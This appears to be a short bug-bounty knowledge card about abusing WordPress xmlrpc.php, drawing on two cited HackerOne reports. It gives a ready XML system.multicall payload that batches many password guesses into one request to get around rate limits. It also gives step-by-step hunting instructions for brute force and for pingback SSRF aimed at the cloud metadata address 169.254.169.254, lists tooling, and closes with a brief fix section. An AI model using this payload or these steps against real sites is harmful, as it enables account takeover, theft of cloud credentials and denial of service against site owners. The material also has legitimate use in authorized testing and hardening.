---
name: rce-xmlrpc
description: WordPress XML-RPC abuse — credential brute-force via system.multicall, pingback SSRF, and auth bypasses. Teaches exploiting exposed xmlrpc.php endpoints.
sources: hackerone_public
report_count: 2
---

# WordPress XML-RPC Abuse

**Reports**: Uber — "OneLogin authentication bypass on WordPress sites via XMLRPC" (#138869, $7,000); Nord Security — "xmlrpc.php enabled, used for Bruteforce and DoS" (#752073).

## Why it matters (the new lesson)
`xmlrpc.php` is enabled by default on millions of WordPress sites and provides unauthenticated capabilities: `system.multicall` (batch many password guesses in ONE request → bypass rate limits), `pingback.ping` (SSRF), and version/fingerprint disclosure. A single exposed endpoint yields credential brute-force, SSRF, and DoS.

## How it works
```xml
<methodCall><methodName>system.multicall</methodName>
<params><param><value><array><data>
  <value><struct>
    <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
    <member><name>params</name><value><array><data>
      <value><string>admin</string></value><value><string>password</string></value>
    </data></array></value></member>
  </struct></value>
  <!-- repeat for many passwords -->
</data></array></value></param></params></methodCall>
```

## How to hunt for it
1. Request `/xmlrpc.php`; check it exists (POST `system.listMethods`).
2. Use `system.multicall` to brute-force many passwords in one request.
3. Test `pingback.ping` with an internal URL (SSRF); check `wp.getUsersBlogs`.

## Payloads / tools
`wpscan`, `xmlrpc-bruteforce` scripts, Burp; `pingback.ping` → `http://169.254.169.254/`.

## Fix
Disable xmlrpc.php if unused; block `system.multicall`/`pingback.ping`; rate-limit + MFA; WAF rules.
